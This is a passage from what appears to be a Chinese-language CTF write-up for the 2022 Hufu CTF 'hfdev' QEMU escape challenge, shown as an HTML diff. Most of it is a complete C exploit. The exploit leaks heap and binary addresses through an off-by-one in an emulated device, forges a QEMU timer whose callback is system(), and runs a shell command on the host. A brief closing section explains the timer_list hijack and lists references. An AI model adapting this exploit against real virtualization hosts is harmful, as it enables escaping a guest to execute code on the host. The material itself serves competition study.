+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">struct</span> <span class="token class-name">RequestEnc</span> encoder<span class="token punctuation">;</span>
+        <span class="token keyword">struct</span> <span class="token class-name">RequestRead</span> reader<span class="token punctuation">;</span>
+        <span class="token keyword">struct</span> <span class="token class-name">RequestTimer</span> timer<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> req<span class="token punctuation">;</span>
+
+    <span class="token class-name">uint64_t</span> heap<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> timer_ptr<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> timer_list_ptr<span class="token punctuation">;</span>
+
+    <span class="token class-name">uint64_t</span> hfdev_func<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> cbase<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> system<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> binsh<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> <span class="token operator">*</span>fake_timer_ptr<span class="token punctuation">;</span>
+
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    pagemap_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/pagemap"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>pagemap_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open pagemap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iopl</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"iopl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">set_phy_addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">set_request_size</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// leak heap</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. leaking heap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// getchar();</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos = 0x200"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC1<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] off-by-one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x300</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reset cache_addr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cache_addr/req_addr</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x310</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    heap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    timer_ptr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x12b8</span><span class="token punctuation">;</span>
+    timer_list_ptr <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x110e8c8</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"heap address: %#lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_list_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_list_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// leak pie</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. leaking pie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// getchar();</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] off-by-one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x300</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x310</span>
+
+    <span class="token comment">// getchar();</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set time delay"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">set_time</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger timer, pos+=8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] modify cache_addr before timer runing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap <span class="token operator">^</span> <span class="token punctuation">(</span>timer_ptr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"waiting for timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// getchar();</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x318</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    hfdev_func <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x310</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    cbase <span class="token operator">=</span> hfdev_func <span class="token operator">-</span> <span class="token number">0x381190</span><span class="token punctuation">;</span>
+    system <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x2d6614</span><span class="token punctuation">;</span>
+    binsh <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x869b82</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hfdev_func = %#lx\n"</span><span class="token punctuation">,</span> hfdev_func<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cbase = %#lx\n"</span><span class="token punctuation">,</span> cbase<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"system = %#lx\n"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"binsh = %#lx\n"</span><span class="token punctuation">,</span> binsh<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. fake timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// getchar();</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] modify timer ptr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x318</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// checker</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x310</span><span class="token punctuation">]</span> <span class="token operator">=</span> hfdev_func <span class="token operator">^</span> <span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger fake timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">set_time</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+    fake_timer_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">;</span>  <span class="token comment">// expire_time</span>
+    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> timer_list_ptr<span class="token punctuation">;</span> <span class="token comment">// timer_list</span>
+    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> system<span class="token punctuation">;</span>  <span class="token comment">// cb</span>
+    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token comment">// opaque</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"echo getflag! &amp;&amp; cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><blockquote>
+<p>跟踪 timer_mod 源码，发现会调用 timer_list 对象里的某个函数指针，伪造 timer_list 就可以不用等回调直接劫持程序控制流了</p>
+</blockquote>
+<blockquote>
+<p>调试是真的麻烦，可以多借助条件断点来调试</p>
+</blockquote>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li>感谢 @Mr.R 师傅的 writeup </li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/qemu/qemu/blob/v6.1.1/util/qemu-timer.c#L356">https://github.com/qemu/qemu/blob/v6.1.1/util/qemu-timer.c#L356</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>feather
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://www.xi4oyu.top/cdcd3a27/" title="2022-虎符CTF-hfdev">http://www.xi4oyu.top/cdcd3a27/</a>
+  </li>
+  <li class="post-copyright-license">
